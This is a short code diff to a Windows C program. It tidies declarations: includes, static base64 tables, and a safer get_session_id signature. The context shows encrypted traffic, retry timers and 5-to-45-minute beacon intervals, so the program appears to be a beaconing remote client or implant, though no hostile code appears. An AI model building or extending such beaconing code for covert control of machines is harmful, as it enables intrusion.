@@ -11,9 +11,9 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <wincodec.h>
+#include <openssl/sha.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
-#include <openssl/sha.h>
 #include <openssl/hmac.h>
 #include <openssl/buffer.h>
 #include <openssl/err.h>
@@ -42,7 +42,7 @@ SOCKET client_socket = INVALID_SOCKET;
 time_t start_time;
 FILE* log_file = NULL;
 int exit_process = FALSE;
-char SESSION_ID[SHA256_DIGEST_LENGTH + 1];
+char SESSION_ID[SESSION_ID_LENGTH + 1];
 char IP_ADDRESS[INET6_ADDRSTRLEN] = {0};
 const boolean LOGGING = TRUE;
 const char* CVER = "0.2.0";
@@ -58,9 +58,8 @@ const int RETRY_INTERVALS[] = {
 };
 static const int BEACON_MIN_INTERVAL = 300000; // 5 minutes
 static const int BEACON_MAX_INTERVAL = 2700000; // 45 minutes
-
-const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-int base64_invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
+static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+static const int base64_invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
 	59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
 	6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
 	21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
@@ -69,7 +68,7 @@ int base64_invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
 
 // Function prototypes
 void log_it(const char* format, ...);
-void get_session_id(const char *ip_address, char *session_id);
+int get_session_id(const char *ip_address, char *session_id, size_t session_id_size);
 char* base64_encode(const unsigned char *data, size_t length);
 unsigned char* base64_decode(const char *data, size_t *length);
 char* encrypt_data(const char *data, const char *shared_key);
